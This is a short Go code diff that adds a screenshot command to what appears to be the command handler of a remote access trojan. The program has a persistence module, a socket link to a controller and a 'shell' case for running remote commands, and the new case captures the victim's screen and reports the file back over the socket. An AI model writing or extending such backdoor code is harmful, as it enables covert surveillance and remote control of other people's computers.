@@ -14,6 +14,7 @@ import(
   "./persist"
   "./config"
   "./socket"
+  "./screenshot"
 )
 
 func main(){
@@ -92,6 +93,13 @@ func handleCMD(token string, sock socket.Socket){
         sock.Write("Finished.")
       }
       fconn.Close()
+
+    case "screenshot":
+      if fileName, err := screenshot.TakeScreenShot(); err != nil {
+        sock.Write(fmt.Sprintf("%v", err))
+      } else {
+        sock.Write(fmt.Sprintln(fileName))
+      }
 
     case "shell":
       cmds := strings.Split(cmd, "shell")
